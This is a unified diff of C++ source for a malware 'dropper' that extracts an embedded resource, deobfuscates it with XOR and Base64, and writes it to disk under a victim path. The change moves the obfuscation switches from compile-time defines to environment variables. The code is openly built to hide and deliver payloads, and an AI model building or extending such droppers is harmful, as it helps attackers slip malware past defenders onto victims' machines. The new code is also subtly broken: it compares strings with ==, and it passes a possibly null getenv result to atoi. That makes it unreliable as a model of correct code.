@@ -39,9 +39,6 @@ void set_name();
 
 // Dropper Configurations
 #define DEAD_IMPORTS
-#define XOR_ENCODE
-//#define XOR_KEY 0x73
-#define BASE64
 // #define RANDOM_NAME
 #define NAME_SIZE 10
 //#define INJECT
@@ -50,9 +47,11 @@ void set_name();
 char name[10 * NAME_SIZE];
 
 // (char*) C:\\example\\path\\to\\your\\payload.exe
-char* victim_name = (char*) "C:\\Windows\\SysWOW64\\calc.exe";
+char* victim_name = (char*) "C:\\Windows\\System32\\calc.exe";
 
-int xor_key = 115;
+int xor_key = atoi(getenv("DROPPER_XOR_KEY"));
+
+bool base64 = getenv("DROPPER_BASE64") == "true";
 
 // Entry Point
 int main(int argc, char* argv[])
@@ -69,13 +68,17 @@ int main(int argc, char* argv[])
 	// Get embedded file size
 	DWORD size = SizeofResource(h, r);
 	// Obfuscation Procedures start here
-#ifdef XOR_ENCODE
-	data = XOR(data, size);
-#endif
 
-#ifdef BASE64
-	data = base64decode(data, &size);
-#endif
+	if (xor_key != 0){
+		std::cout << "Xor has been run!\n";
+		data = XOR(data, size);
+	}
+
+	if (base64 == true){
+		std::cout << "Base64 has been run!\n";
+		data = base64decode(data, &size);
+	}
+
 	// where to drop
 	set_name();
 	// Drop to Disk
